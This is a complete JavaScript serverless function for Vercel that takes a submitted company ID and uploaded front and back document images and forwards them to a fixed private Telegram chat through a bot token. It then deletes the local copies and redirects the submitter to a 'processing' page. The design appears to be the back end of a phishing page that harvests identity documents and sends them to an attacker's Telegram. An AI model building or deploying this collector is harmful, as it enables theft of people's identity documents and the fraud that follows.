import fs from 'fs';
import FormData from 'form-data';
import formidable from 'formidable';
import axios from 'axios';

// NOTE: Ensure TELEGRAM_BOT_TOKEN is set in Vercel Environment Variables
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
const CHAT_ID = '8483934112'; // Your fixed chat ID

/**
 * Vercel Serverless Function handler for form submissions.
 */
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }
    
    // Crucial check for configuration
    if (!BOT_TOKEN) {
        console.error("Configuration Error: TELEGRAM_BOT_TOKEN is missing.");
        return res.status(500).send('Configuration Error: Missing Bot Token');
    }

    const form = formidable({});
    
    let fields;
    let files;
    
    // --- 1. Parse incoming form data (files and text) ---
    try {
        // This is the intended usage for formidable v3+ with async/await
        [fields, files] = await form.parse(req);
    } catch (err) {
        console.error('Formidable Parse Crash:', err);
        return res.status(500).send('File Upload Processing Failed');
    }

    // Adapt fields from formidable's array structure
    const companyId = fields.companyId ? fields.companyId[0] : '';
    const frontFile = files.frontUpload ? files.frontUpload[0] : null;
    const backFile = files.backUpload ? files.backUpload[0] : null;

    // --- 2. Telegram Helpers ---
    
    async function sendMessage(chatId, text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(url, { chat_id: chatId, text: text });
        } catch (error) {
            console.error('Telegram Send Message Error:', error.response?.data || error.message);
        }
    }

    async function sendDocument(chatId, file) {
        if (!file || file.size === 0) return;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        // Ensure file exists and get the read stream
        if (!fs.existsSync(file.filepath)) {
             console.error(`File path does not exist: ${file.filepath}`);
             return;
        }

        const fileStream = fs.createReadStream(file.filepath);
        
        // Append the file stream with correct metadata
        formData.append('document', fileStream, {
            filename: file.originalFilename,
            contentType: file.mimetype,
        });

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        
        try {
            await axios.post(url, formData, { 
                headers: formData.getHeaders(), 
                timeout: 60000 // Increase timeout for large files
            });
            
            // Clean up the temporary file after successful transmission
            fs.unlinkSync(file.filepath); 
            
        } catch (error) {
            console.error('Telegram Send Document Error:', error.response?.data || error.message);
            // Attempt to clean up even on error
            try { fs.unlinkSync(file.filepath); } catch(e) {}
        }
    }

    // --- 3. Execution ---
    if (companyId) { 
        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`); 
    }
    
    await sendDocument(CHAT_ID, frontFile);
    await sendDocument(CHAT_ID, backFile);
    
    await sendMessage(CHAT_ID, "✅ All files and data received successfully.");

    // --- 4. Redirect the user (Serverless response) ---
    res.setHeader('Location', '/processing.html');
    res.status(302).end();
}
